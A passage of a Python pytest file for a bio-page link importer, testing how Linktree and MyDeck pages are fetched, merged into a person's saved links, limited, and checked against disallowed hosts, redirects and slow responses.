        ("https://ok.example/8", ""), ("https://ok.example/9", ""), ("https://ok.example/10", "T [1m")]
    for x in person_links(client, bio["id"]):
        assert x["url"].startswith("https://") and x["notes"] == "" and x["people"] == [{"id": bio["id"], "name": "Alice"}]
        assert all(c.isprintable() for c in x["url"] + x["title"])


# ---------------------------------------------------------------------------
# The import, again: only what is new, nothing changed, nothing removed
# ---------------------------------------------------------------------------

def test_the_first_import_saves_the_page_and_its_links(bio, client, monkeypatch):
    net = bio_net(LINKTREE_PAGE)
    monkeypatch.setattr(biofetch, "FETCHER", net.fetcher())
    r = bio_import(client, bio["id"])
    assert r["links"] == {"saved": 9, "already": 0, "shared": 0, "over": 0, "dropped": 1}
    assert saved(client, bio["id"]) == LINKTREE_KEPT
    # Links like any other: theirs, in the order of the page, social or not by their host.
    got = person_links(client, bio["id"])
    assert [x["position"] for x in got] == list(range(1, 10))
    assert {x["url"]: x["kind"] for x in got}["https://alice-shop.example/store?ref=linktree"] == "other"
    assert {x["url"]: x["kind"] for x in got}["https://www.patreon.com/alice"] == "social"
    assert all(x["people"] == [{"id": bio["id"], "name": "Alice"}] and x["notes"] == "" for x in got)
    # The accounts are suggested as before, none added.
    assert {(a["platform"], a["handle"]): a["status"] for a in r["accounts"]} == {
        ("instagram", "alice.example"): "linked", ("tiktok", "new.one"): "new", ("twitter", "Example_User1"): "indexed"}
    assert net.connects == [PUBLIC] and net.lookups == ["linktr.ee"]        # the page, and no link of it


def test_importing_again_saves_only_what_is_new(bio, client, monkeypatch):
    from test_people import post
    monkeypatch.setattr(biofetch, "FETCHER", bio_net(LINKTREE_PAGE).fetcher())
    bio_import(client, bio["id"])
    by_url = {x["url"]: x for x in person_links(client, bio["id"])}
    # The user makes them theirs: a title, notes, another order.
    patreon, discord = by_url["https://www.patreon.com/alice"], by_url["https://discord.gg/AbCdEf"]
    post(client, f"/api/links/{patreon['id']}", {"title": "Patreon (tiers from 3 €)", "notes": "joined in May"})
    post(client, f"/api/links/{discord['id']}", {"title": ""})
    post(client, f"/api/people/{bio['id']}/links/order", {"ids": [discord["id"], patreon["id"]]})
    before = person_links(client, bio["id"])

    # The page changed: the shop and the video are gone, Patreon has a new label, two links are new.
    changed = [{"title": "Support me!!", "url": "https://www.patreon.com/alice"}, BUTTONS[3], BUTTONS[7], BUTTONS[8],
               {"title": "New album", "url": "https://alice.bandcamp.example/album/two"},
               {"title": "Patreon again", "url": "http://patreon.com/alice/"}]
    page = linktree_page(changed, SOCIALS[:2] + [("YOUTUBE", "https://www.youtube.com/@alicevids")])
    monkeypatch.setattr(biofetch, "FETCHER", bio_net(page).fetcher())
    r = bio_import(client, bio["id"])
    assert r["links"] == {"saved": 2, "already": 8, "shared": 0, "over": 0, "dropped": 0}
    after = person_links(client, bio["id"])
    assert after[:9] == before                 # ids, titles, notes, order: as they were
    assert [(x["url"], x["title"], x["position"]) for x in after[9:]] == [
        ("https://www.youtube.com/@alicevids", "", 10), ("https://alice.bandcamp.example/album/two", "New album", 11)]
    kept = {x["url"]: x for x in after}
    assert kept["https://www.patreon.com/alice"]["title"] == "Patreon (tiers from 3 €)"
    assert kept["https://www.patreon.com/alice"]["notes"] == "joined in May"
    assert kept["https://discord.gg/AbCdEf"]["title"] == ""                  # emptied by the user: not filled again
    assert "https://alice-shop.example/store?ref=linktree" in kept          # taken down by its owner: still here
    assert "https://www.youtube.com/watch?v=abc123" in kept

    # The page is gone altogether: the import fails, and nothing saved goes with it.
    monkeypatch.setattr(biofetch, "FETCHER", Net(pages={("linktr.ee", "/alice"): html_answer(b"", status="404 Not Found")}).fetcher())
    assert bio_import(client, bio["id"], status=502)["error"] == "the site answered 404"
    assert person_links(client, bio["id"]) == after
    # And an import that finds nothing new changes nothing.
    monkeypatch.setattr(biofetch, "FETCHER", bio_net("").fetcher())
    assert bio_import(client, bio["id"])["links"] == {"saved": 0, "already": 1, "shared": 0, "over": 0, "dropped": 0}
    assert person_links(client, bio["id"]) == after


def test_a_link_saved_for_someone_else_becomes_theirs_too(bio, client, monkeypatch):
    """A shared account (a band's, on each member's page): the link saved
    for Bob becomes this person's too, last in their order, and stays
    Bob's, where it was, its title and notes as they were. One of no one's
    leaves Unsorted the same way."""
    from test_people import get, post
    [bob] = [p for p in get(client, "/api/people") if p["name"] == "Bob"]
    theirs = post(client, "/api/links", {"url": "https://www.patreon.com/alice", "title": "Bob's", "notes": "his",
                                         "person": bob["id"]})["link"]
    loose = post(client, "/api/links", {"url": "https://discord.gg/AbCdEf", "notes": "to sort"})["link"]
    monkeypatch.setattr(biofetch, "FETCHER", bio_net(LINKTREE_PAGE).fetcher())
    r = bio_import(client, bio["id"])
    assert r["links"] == {"saved": 7, "already": 0, "shared": 2, "over": 0, "dropped": 1}
    mine = {x["url"]: x for x in person_links(client, bio["id"])}
    both = [{"id": bio["id"], "name": "Alice"}, {"id": bob["id"], "name": "Bob"}]           # by name
    assert {k: mine["https://www.patreon.com/alice"][k] for k in ("id", "title", "notes", "people")} == \
        {"id": theirs["id"], "title": "Bob's", "notes": "his", "people": both}
    assert mine["https://discord.gg/AbCdEf"]["notes"] == "to sort"
    assert person_links(client, bob["id"]) == [{**theirs, "people": both, "position": 1}]
    assert get(client, "/api/links?person=none")["links"] == []
    assert loose["id"] in {x["id"] for x in person_links(client, bio["id"])}
    # Again: theirs already, nothing changes.
    assert bio_import(client, bio["id"])["links"]["shared"] == 0
    assert person_links(client, bob["id"]) == [{**theirs, "people": both, "position": 1}]


def test_an_import_saves_at_most_max_saved_links(bio, client, monkeypatch):
    monkeypatch.setattr(biofetch, "MAX_SAVED", 5)
    page = "".join(f'<a href="https://shop.example/item/{i}">Item {i}</a>' for i in range(12))
    monkeypatch.setattr(biofetch, "FETCHER", bio_net(page).fetcher())
    r = bio_import(client, bio["id"])
    assert r["links"] == {"saved": 5, "already": 0, "shared": 0, "over": 8, "dropped": 0}
    assert saved(client, bio["id"]) == [("https://linktr.ee/alice", "")] + [
        (f"https://shop.example/item/{i}", f"Item {i}") for i in range(4)]
    # The next import goes on from there: what is saved does not count against the limit.
    r = bio_import(client, bio["id"])
    assert r["links"] == {"saved": 5, "already": 5, "shared": 0, "over": 3, "dropped": 0}
    assert [u for u, _ in saved(client, bio["id"])][5:] == [f"https://shop.example/item/{i}" for i in range(4, 9)]


def test_the_limits_of_what_one_import_reads_and_saves(bio, client, monkeypatch):
    assert biofetch.MAX_SAVED == 200 and biofetch.MAX_SAVED <= biofetch.MAX_LINKS
    page = "".join(f'<a href="https://shop.example/item/{i}">Item {i}</a>' for i in range(3000))
    found, dropped = biofetch.shown_links(page, "https://linktr.ee/alice", ROUTES)
    assert len(found) == biofetch.MAX_LINKS and dropped == 0
    page = "".join(f'<a href="javascript:a{i}()">x</a>' for i in range(3000)) + '<a href="https://late.example/">late</a>'
    found, dropped = biofetch.shown_links(page, "https://linktr.ee/alice", ROUTES)
    assert found == [("https://linktr.ee/alice", "")] and dropped == biofetch.MAX_LINKS - 1
    monkeypatch.setattr(biofetch, "FETCHER", bio_net(
        "".join(f'<a href="https://shop.example/item/{i}">Item {i}</a>' for i in range(3000))).fetcher())
    r = bio_import(client, bio["id"])
    assert r["links"] == {"saved": 200, "already": 0, "shared": 0, "over": 800, "dropped": 0}
    assert len(person_links(client, bio["id"])) == 200


def test_a_huge_label_or_block_is_read_within_bounds():
    import time
    page = '<a href="https://shop.example/a">' + "<b>x</b>" * 200_000 + "</a>"
    start = time.monotonic()
    found, _ = biofetch.shown_links(page, "https://linktr.ee/alice", ROUTES)
    assert found[1] == ("https://shop.example/a", "x" * 300)
    blob = '<script type="application/json">' + json_shown_list(150_000) + "</script>"
    found, _ = biofetch.shown_links(blob, "https://linktr.ee/alice", ROUTES)
    assert len(found) == biofetch.MAX_LINKS
    deep = '<script type="application/json">' + '{"url":' * 50_000 + '"https://shop.example/deep"' + "}" * 50_000 + "</script>"
    assert biofetch.shown_links(deep, "https://linktr.ee/alice", ROUTES)[0] in (
        [("https://linktr.ee/alice", "")], [("https://linktr.ee/alice", ""), ("https://shop.example/deep", "")])
    assert time.monotonic() - start < 20


def json_shown_list(n):
    import json
    return json.dumps({"links": [{"title": "t%d" % i, "url": "https://shop.example/j%d" % i} for i in range(n)]})


def test_saved_links_are_mirrored_like_any_other(bio, env, client, monkeypatch):
    import json
    import db
    import userdata
    seen = []
    monkeypatch.setattr(userdata, "changed", seen.append)
    monkeypatch.setattr(biofetch, "FETCHER", bio_net(LINKTREE_PAGE).fetcher())
    bio_import(client, bio["id"])
    assert seen == ["links"]
    bio_import(client, bio["id"])              # nothing new: nothing to write
    assert seen == ["links"]
    data = str(env["tmp"] / "data")
    userdata.export(db.connect(), "links", data)
    with open(userdata.path(data, "links")) as f:
        rows = json.load(f)["rows"]
    assert sorted((r["people"][0]["position"], r["url"], r["title"], [p["name"] for p in r["people"]], r["notes"])
                  for r in rows) == [(n, url, title, ["Alice"], "") for n, (url, title) in enumerate(LINKTREE_KEPT, 1)]
    assert all(r["people"][0]["tied_at"] == r["created_at"] and r["id"] for r in rows)
    # And they come back from the file as the API saved them.
    import links
    assert [links.restore_row(r) for r in rows] == rows


def test_nothing_saved_is_ever_fetched(bio, client, monkeypatch):
    """The one page is fetched; its links are text from then on."""
    import urllib.request

    def refuse(*a, **k):
        raise AssertionError("links must never be fetched")
    net = bio_net(LINKTREE_PAGE)
    monkeypatch.setattr(biofetch, "FETCHER", net.fetcher())
    monkeypatch.setattr(socket, "create_connection", refuse)
    monkeypatch.setattr(socket, "getaddrinfo", refuse)
    monkeypatch.setattr(urllib.request, "urlopen", refuse)
    bio_import(client, bio["id"])
    client.get(f"/api/people/{bio['id']}", headers=H)
    client.get("/api/links", headers=H)
    assert net.lookups == ["linktr.ee"] and net.connects == [PUBLIC] and len(net.socks) == 1


def test_nothing_is_saved_when_the_import_is_refused(env, client, monkeypatch):
    from test_people import create, get, post
    p = create(client, "Alice")["person"]
    monkeypatch.setattr(biofetch, "FETCHER", bio_net(LINKTREE_PAGE).fetcher())
    bio_import(client, p["id"], status=403)                                     # switched off
    post(client, "/api/config", {"bio_import": True})
    bio_import(client, p["id"], "https://evil.example/alice", status=400)
    bio_import(client, p["id"], headers={**H, "Origin": "https://linktr.ee"}, status=403)
    bio_import(client, 999, status=404)
    assert get(client, "/api/links")["links"] == []


def test_a_person_deleted_during_the_fetch_gets_no_links(bio, client, monkeypatch):
    import db
    import people
    from test_people import get

    class Deleting:
        def fetch(self, url):
            people.delete(db.connect(), bio["id"])     # not a request of its own: this one is being answered
            return biofetch.Page("https://linktr.ee/alice", LINKTREE_PAGE)
    monkeypatch.setattr(biofetch, "FETCHER", Deleting())
    assert bio_import(client, bio["id"], status=404)["error"] == "no such person"
    assert get(client, "/api/links")["links"] == []


# ---------------------------------------------------------------------------
# Subdomain sites (mydeck.bio): <name>.mydeck.bio/, buttons as /go/<n>
# redirects on the page's own host
# ---------------------------------------------------------------------------

DECK = "carol.mydeck.bio"

# A MyDeck page as the site serves it (drawn on the server): each button is
# /go/<n> on the page's host, which redirects to where it goes; the
# address is nowhere in the page. Images on the site's R2 bucket, fonts
# from Google, the site's own pages in the footer.
MYDECK_PAGE = """<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Carol | MyDeck</title>
<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
<meta property="og:image" content="https://pub-0a1b2c3d4e5f.r2.dev/avatars/carol.webp"></head>
<body><main class="card"><img class="avatar" src="https://pub-0a1b2c3d4e5f.r2.dev/avatars/carol.webp" alt="Carol">
<h1>Carol</h1><a class="banner" href="https://pub-0a1b2c3d4e5f.r2.dev/banners/carol">banner</a>
<div class="links" id="visible-links"><a href="/go/1" class="link-btn" rel="noopener noreferrer"><svg viewBox="0 0 24 24"><path d="M0 0h24v24H0z"/></svg><span>Instagram</span></a><a href="/go/2" class="link-btn" rel="noopener noreferrer"><svg viewBox="0 0 24 24"></svg><span>Reddit</span></a></div>
<footer><a href="https://mydeck.bio/">Made with MyDeck</a><a href="https://mydeck.bio/signup">Create yours</a></footer>
</main></body></html>"""
MYDECK_GO = {
    "/go/1": "https://www.instagram.com/carol.example/",
    "/go/2": "https://www.reddit.com/user/Carol_Example-/",
}
MYDECK_KEPT = [
    (f"https://{DECK}", ""), ("https://www.instagram.com/carol.example/", "Instagram"),     # as links.py stores it
    ("https://www.reddit.com/user/Carol_Example-/", "Reddit"),
]


def deck_net(page=MYDECK_PAGE, go=None):
    """A Net with the MyDeck page at carol.mydeck.bio/ and its /go/<n>
    answers (``go``: {path: Location} as redirects, or {path: answer})."""
    answers = {(DECK, "/"): html_answer(page.encode())}
    for path, value in (MYDECK_GO if go is None else go).items():
        answers[(DECK, path)] = redirect(value) if isinstance(value, str) else value
    return Net(dns={DECK: [PUBLIC]}, pages=answers)


def requested(net):
    """(host, request line) of every request sent."""
    return [(s.host, s.sent.split(b"\r\n", 1)[0].decode()) for s in net.socks]


def kept(page):
    return biofetch.shown_links(biofetch.read(page.text, page.url, page.resolved), page.url, ROUTES)


@pytest.mark.parametrize("url", [
    f"https://{DECK}/", f"https://{DECK}", DECK, "https://Carol.MyDeck.Bio/", f"https://www.{DECK}/",
    f"https://{DECK}./", f"https://{DECK}:443/", "https://ｃａｒｏｌ.mydeck.bio/",
])
def test_a_mydeck_profile_is_its_subdomain(url):
    net = deck_net(page="<p>hi</p>")
    page = net.get(url)
    assert page.url == f"https://{DECK}/" and page.resolved == {}
    assert net.lookups == [DECK] and net.tls == [(PUBLIC, DECK)]


@pytest.mark.parametrize("url, error", [
    ("https://mydeck.bio/", "not the site's home page"),
    ("https://mydeck.bio/carol", "not the site's home page"),
    ("https://www.mydeck.bio/", "not the site's home page"),               # www. is dropped: the site itself
    ("mydeck.bio", "not the site's home page"),
    ("https://a.carol.mydeck.bio/", "not an allowed site: a.carol.mydeck.bio"),   # one label only
    ("https://api.mydeck.bio/", "not an allowed site: api.mydeck.bio"),
    ("https://cdn2.mydeck.bio/", "not an allowed site"),
    ("https://admin.mydeck.bio/", "not an allowed site"),
    ("https://www.www.mydeck.bio/", "not an allowed site"),
    ("https://evilmydeck.bio/", "not an allowed site: evilmydeck.bio"),
    ("https://carol.mydeck.bio.evil.example/", "not an allowed site"),
    ("https://carol-.mydeck.bio/", "not an allowed site"),
    ("http://carol.mydeck.bio/", "only https links"),
    ("https://carol.mydeck.bio:8443/", "only https's own port"),
    ("https://x@carol.mydeck.bio/", "login part"),
])
def test_mydeck_links_refused_before_anything_is_looked_up(url, error):
    net = Net()
    assert error in refused(net, url)
    assert net.lookups == net.connects == []


def test_the_allowed_list_names_subdomain_sites():
    assert "<name>.mydeck.bio" in refused(Net(), "https://evil.example/a")


def test_a_mydeck_redirect_is_checked_as_a_first_link_is():
    net = deck_net(go={"/old": redirect("https://dave.mydeck.bio/")})
    net.dns["dave.mydeck.bio"] = [PUBLIC]
    net.pages[("dave.mydeck.bio", "/")] = html_answer(b"<p>dave</p>")
    assert net.get(f"https://{DECK}/old").url == "https://dave.mydeck.bio/"
    for location in ("https://mydeck.bio/", "https://a.b.mydeck.bio/", "https://api.mydeck.bio/"):
        net = deck_net(go={"/old": redirect(location)})
        assert "redirects elsewhere" in refused(net, f"https://{DECK}/old")
        assert net.lookups == [DECK]


def test_a_mydeck_page_resolves_its_go_links_on_its_own_host():
    net = deck_net()
    page = net.get(DECK)
    assert page.resolved == {f"https://{DECK}/go/1": MYDECK_GO["/go/1"], f"https://{DECK}/go/2": MYDECK_GO["/go/2"]}
    assert requested(net) == [(DECK, "GET / HTTP/1.1"), (DECK, "GET /go/1 HTTP/1.1"), (DECK, "GET /go/2 HTTP/1.1")]
    # Each through the same checks (a lookup, its addresses, TLS on the
    # page's own name), a gap before each; nothing a redirect names is
    # fetched, not Instagram, not Reddit.
    assert net.lookups == [DECK] * 3 and net.tls == [(PUBLIC, DECK)] * 3
    assert net.sleeps == [biofetch.LOOKUP_GAP] * 2
    assert kept(page) == (MYDECK_KEPT, 0)                       # no r2.dev image, no font, no mydeck.bio page


def test_a_relative_location_is_made_absolute_and_kept_as_text():
    net = deck_net(go={"/go/1": "/carol/about", "/go/2": "//shop.example/carol"})
    page = net.get(DECK)
    assert page.resolved == {f"https://{DECK}/go/1": f"https://{DECK}/carol/about",
                             f"https://{DECK}/go/2": "https://shop.example/carol"}
    assert len(net.socks) == 3                                  # neither is fetched
    assert kept(page) == ([(f"https://{DECK}", ""), ("https://shop.example/carol", "Reddit")], 0)


def test_a_go_link_that_fails_or_does_not_redirect_is_skipped():
    net = deck_net(page="".join(f'<a href="/go/{n}">b{n}</a>' for n in range(1, 8)), go={
        "/go/1": html_answer(b"<p>a page</p>"),                       # 200
        "/go/2": html_answer(status="404 Not Found"),
        "/go/3": b"garbage\r\n\r\n",                                    # not HTTP
        "/go/4": html_answer(b"", status="302 Found"),                  # nowhere to go
        "/go/5": "https://" + "a" * biofetch.URL_MAX + ".example/",    # too long
        "/go/6": lambda: setattr(net, "delay", 100) or redirect("https://late.example/"),   # times out
        "/go/7": lambda: setattr(net, "delay", 0) or redirect("https://shop.example/carol"),
    })
    page = net.get(DECK)
    assert page.resolved == {f"https://{DECK}/go/7": "https://shop.example/carol"}
    assert len(net.socks) == 8
    assert kept(page) == ([(f"https://{DECK}", ""), ("https://shop.example/carol", "b7")], 0)


def test_a_go_link_that_cannot_be_reached_is_skipped():
    net = deck_net()
    connect = net.connect

    def refuse_go(family, sockaddr, timeout):
        if net.connects:                                        # the page, then nothing answers
            net.connects.append(sockaddr[0])
            raise ConnectionRefusedError(111, "Connection refused")
        return connect(family, sockaddr, timeout)
    net.connect = refuse_go
    page = net.get(DECK)
    assert page.resolved == {} and net.connects == [PUBLIC] * 3


def test_a_go_link_is_never_asked_on_another_host():
    hrefs = ["https://dave.mydeck.bio/go/1", "//dave.mydeck.bio/go/2", "https://evil.example/go/3",
             "https://mydeck.bio/go/4", "/go/5?x=1", "/go/abc", "/go/6/more", "/go/", "/go/7/",
             f"https://{DECK}:8443/go/8", f"http://{DECK}/go/9", f"https://u@{DECK}/go/10", "/go/1234567890",
             "https://api.mydeck.bio/go/11", "javascript:/go/12", "/Go/13"]
    net = deck_net(page="".join(f'<a href="{h}">x</a>' for h in hrefs), go={})
    net.dns.update({"dave.mydeck.bio": [PUBLIC], "mydeck.bio": [PUBLIC], "evil.example": [PUBLIC]})
    page = net.get(DECK)
    assert page.resolved == {} and net.lookups == [DECK] and len(net.socks) == 1 and net.sleeps == []


def test_only_redirect_link_sites_ask_their_links():
    page = '<a href="/go/1">Instagram</a><a href="https://linktr.ee/go/2">x</a>'
    net = Net(pages={("linktr.ee", "/alice"): html_answer(page.encode())})
    assert net.get("https://linktr.ee/alice").resolved == {} and len(net.socks) == 1
    assert biofetch.redirect_link("/go/1", "https://linktr.ee/alice") is None
    assert biofetch.redirect_link("/go/1", f"https://{DECK}/") == f"https://{DECK}/go/1"
    assert biofetch.redirect_link(f"https://www.{DECK}/go/1", f"https://{DECK}/") == f"https://{DECK}/go/1"
    assert biofetch.redirect_link("/go/1#top", f"https://{DECK}/") == f"https://{DECK}/go/1"


def test_a_redirects_body_is_never_read():
    body = b"<html>" + b"SECRET BODY " * 100 + b"</html>"
    net = deck_net(go={"/go/1": html_answer(body, status="302 Found", headers={"Location": MYDECK_GO["/go/1"]}),
                       "/go/2": html_answer(body)})               # nor a 200's
    net.chunk = 1                                               # a byte per recv: what is not asked stays unread
    page = net.get(DECK)
    assert page.resolved == {f"https://{DECK}/go/1": MYDECK_GO["/go/1"]}
    assert [s.out for s in net.socks[1:]] == [body, body]
    assert all(s.closed for s in net.socks)


def test_go_lookups_are_capped_and_counted_once():
    n = biofetch.MAX_LOOKUPS + 10
    page = "".join(f'<a href="/go/{i}">b{i}</a><a href="https://{DECK}/go/{i}">again</a>' for i in range(n))
    net = deck_net(page=page, go={f"/go/{i}": f"https://shop.example/{i}" for i in range(n)})
    got = net.get(DECK).resolved
    assert len(got) == biofetch.MAX_LOOKUPS == len(net.socks) - 1
    assert list(got) == [f"https://{DECK}/go/{i}" for i in range(biofetch.MAX_LOOKUPS)]
    assert net.sleeps == [biofetch.LOOKUP_GAP] * biofetch.MAX_LOOKUPS


def test_go_lookups_stop_at_the_import_time():
    page = "".join(f'<a href="/go/{i}">b{i}</a>' for i in range(20))
    net = deck_net(page=page, go={f"/go/{i}": f"https://shop.example/{i}" for i in range(20)})
    net.delay = 0.1                                             # each piece of an answer takes 0.1 s
    start = net.clock.t
    got = net.fetcher(import_time=3).fetch(DECK).resolved
    assert 0 < len(got) < 10 and len(net.socks) == len(got) + 1
    assert net.clock.t <= start + 3


def test_a_slow_go_lookup_has_its_own_timeout():
    net = deck_net(go={"/go/1": lambda: setattr(net, "delay", 100) or redirect(MYDECK_GO["/go/1"]),
                       "/go/2": lambda: setattr(net, "delay", 0) or redirect(MYDECK_GO["/go/2"])})
    start = net.clock.t
    page = net.get(DECK)
    assert page.resolved == {f"https://{DECK}/go/2": MYDECK_GO["/go/2"]}
    assert net.clock.t - start <= 2 * biofetch.LOOKUP_GAP + biofetch.LOOKUP_TIMEOUT + 0.01


def test_mydeck_own_pages_are_not_links_to_keep():
    own = biofetch._own(DECK)
    assert own == ("mydeck.bio",)
    for link in ("https://mydeck.bio/", "https://dave.mydeck.bio/", f"https://{DECK}/go/1", "https://www.mydeck.bio/x"):
        assert biofetch._visitor_url(link, own) == (None, "plumbing")
    assert biofetch._visitor_url("https://pub-0a1b2c3d4e5f.r2.dev/x", ()) == (None, "plumbing")
    assert biofetch._visitor_url("https://linktr.ee/dave", own) == ("https://linktr.ee/dave", None)


def test_a_mydeck_import_end_to_end(bio, client, monkeypatch):
    net = deck_net()
    monkeypatch.setattr(biofetch, "FETCHER", net.fetcher())
    r = bio_import(client, bio["id"], url=f"https://{DECK}/")
    assert r["url"] == f"https://{DECK}/"
    assert {(a["platform"], a["handle"]): a["status"] for a in r["accounts"]} == {
        ("instagram", "carol.example"): "new", ("reddit", "Carol_Example-"): "new"}
    assert r["links"] == {"saved": 3, "already": 0, "shared": 0, "over": 0, "dropped": 0}
    assert saved(client, bio["id"]) == MYDECK_KEPT
    assert set(net.lookups) == {DECK} and len(net.socks) == 3


def test_a_mydeck_import_without_answers_keeps_the_page(bio, client, monkeypatch):
    net = deck_net(go={"/go/1": html_answer(status="500 Oops"), "/go/2": html_answer()})
    monkeypatch.setattr(biofetch, "FETCHER", net.fetcher())
    r = bio_import(client, bio["id"], url=DECK)
    assert r["accounts"] == [] and r["links"]["saved"] == 1 and r["links"]["dropped"] == 0
    assert saved(client, bio["id"]) == [(f"https://{DECK}", "")]
